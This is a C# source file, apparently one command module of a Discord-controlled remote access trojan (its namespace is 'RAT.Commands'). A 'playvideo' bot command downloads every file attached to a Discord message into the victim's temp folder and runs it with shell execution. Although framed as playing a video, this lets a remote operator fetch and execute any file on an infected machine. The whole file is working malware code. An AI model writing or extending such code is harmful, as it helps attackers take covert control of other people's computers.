using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace RAT.Commands
{
    public class PlayVideoCommand : ModuleBase<SocketCommandContext>
    {
        [Command("playvideo")]
        public async Task PlayVideoCmd()
        {
            // Get the attachments from the message
            var attachments = Context.Message.Attachments;

            foreach (var attachment in attachments)
            {
                // Download the attached video file
                string videoPath = Path.Combine(Path.GetTempPath(), attachment.Filename);
                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(attachment.Url, videoPath);
                }

                // Play the video file using the default player
                Process.Start(new ProcessStartInfo(videoPath) { UseShellExecute = true });
                await ReplyAsync("Video Player has started");
            }
        }
    }
}
